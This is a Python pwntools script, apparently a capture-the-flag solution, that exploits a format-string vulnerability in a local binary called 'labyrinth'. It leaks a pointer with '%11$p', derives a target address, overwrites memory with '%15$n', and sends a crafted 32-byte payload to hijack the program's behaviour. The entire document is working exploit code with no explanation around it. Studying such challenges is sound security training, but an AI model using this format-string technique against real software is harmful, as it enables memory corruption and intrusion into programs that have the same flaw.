from pwn import *
import re

context.log_level = "info"
context.log_level = "debug"
context.timeout = 3

io = process("./labyrinth")

def explore(name, size):
    io.sendlineafter(b"> ", b"explore")
    io.sendlineafter(b"Room name: ", name)
    io.sendlineafter(b"Room size: ", str(size).encode())

def look_until_data(room_id):
    io.sendlineafter(b"> ", b"look")
    io.sendlineafter(b"Room ID: ", str(room_id).encode())
    return io.recvuntil(b"Room data: ")

explore(b"%11$p", 32)
out = look_until_data(0)
print(out.decode(errors="replace"))

match = re.search(rb"Room 0: (0x[0-9a-fA-F]+)", out)
if not match:
    raise RuntimeError("Pointer data room tidak ditemukan")

data_ptr = int(match.group(1), 16)

target = data_ptr - 0x18

log.info(f"Data pointer : {data_ptr:#x}")
log.info(f"Target size  : {target:#x}")

io.recvn(32)
io.recvuntil(b"Room size: 32\n")

explore(b"%15$n", 32)

io.sendlineafter(b"> ", b"map")
io.sendlineafter(b"Room ID: ", b"1")
io.recvuntil(b"Data (32 bytes): ")

payload = p64(target) + b"B" * 23 + b"\n"
assert len(payload) == 32
io.send(payload)

io.recvuntil(b"Data written.\n")

out = look_until_data(1)
print(out.decode(errors="replace"))

io.recvn(32)
io.recvuntil(b"Room size: 32\n")

io.sendlineafter(b"> ", b"navigate")
print(io.recvuntil(b"> ").decode(errors="replace"))

io.close()
